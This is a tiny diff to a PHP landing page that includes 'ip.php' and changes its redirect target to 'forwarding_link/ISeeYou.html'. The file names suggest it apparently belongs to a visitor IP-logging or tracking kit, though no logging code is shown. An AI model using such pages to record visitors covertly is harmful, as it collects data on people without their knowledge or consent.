@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: /index2.html');
-exit
+header('Location: forwarding_link/ISeeYou.html', true, 302);
+exit();
 ?>
